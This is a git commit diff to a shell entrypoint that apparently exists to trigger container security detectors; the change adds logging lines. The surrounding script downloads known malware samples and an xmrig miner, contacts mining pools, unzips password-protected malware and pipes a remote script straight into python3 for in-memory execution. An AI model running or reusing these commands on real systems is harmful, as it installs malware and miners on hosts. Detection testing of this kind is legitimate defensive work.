05c36cb7e46cd9d4b564ac3a6c4668f312e2bd4d
Teodelas <teodelas@outlook.com>
2024-09-29 10:10:10 -0400

    Update entrypoint.sh

--- app/entrypoint.sh
+++ app/entrypoint.sh
@@ -1,14 +1,18 @@
 # Run web server
-#mvn jetty:run
+echo "Starting jetty" > entry_point_log.txt
+mvn jetty:run &
 
+echo "Creating Executable" >> entry_point_log.txt
 # Executable creation
 # Both solutions detect the exec creation
 echo "#include <stdio.h>\n int main() { printf(\"Hello, World!\"); return 0; }" > /home/app/main2.c
 gcc /home/app/main2.c -o /home/app/main2.o
 
+echo "Downloading original_malware_443" >> entry_point_log.txt
 # Dropper & Known malware
 wget https://github.com/FaridArbai/mws/raw/master/original_malware_433
 
+echo "Bad Reputation communication" >> entry_point_log.txt
 # Bad reputation communication
 curl us-west.minexmr.com &
 curl pool.minexmr.com &
@@ -21,6 +25,7 @@ modprobe iptable_nat
 modprobe iptable_security
 modprobe -r msr
 
+echo "xmrig" >> entry_point_log.txt
 wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz
 tar -xvf xmrig*
 cd xmrig-6.18.0
@@ -29,7 +34,7 @@ cd xmrig-6.18.0
 
 curl -fsSL https://github.com/FaridArbai/mws/raw/master/exec_elf_in_memory.py | python3
 
-
+echo "Downloading rare malware" >> entry_point_log.txt
 # Download rare malware samples to check for detection accuracy
 
 wget https://github.com/MalwareSamples/Malware-Feed/raw/master/2021.04.15_CISA-SUNSHUTTLE/6b01eeef147d9e0cd6445f90e55e467b930df2de5d74e3d2f7610e80f2c5a2cd
@@ -41,3 +46,5 @@ unzip -P infected Paypal.zip
 wget https://github.com/MalwareSamples/Malware-Feed/raw/master/2020.09.18_Checkpoint-Rampant_Kitten/1b8cd7c93dce63878dadae0cf77482ae367477841a4604c6a842158466790737
 wget https://github.com/MalwareSamples/Malware-Feed/raw/master/2020.12.17_ClearSky-Pay2Kitten/df86cd16a3008dba00590edae31d1313bd92528aca92c4f4ea7f24000ba62547
 wget https://github.com/MalwareSamples/Malware-Feed/raw/master/2020.07.16_CISA-WELLMAIL/0c5ad1e8fe43583e279201cdb1046aea742bae59685e6da24e963a41df987494
+
+echo "Complete" >> entry_point_log.txt
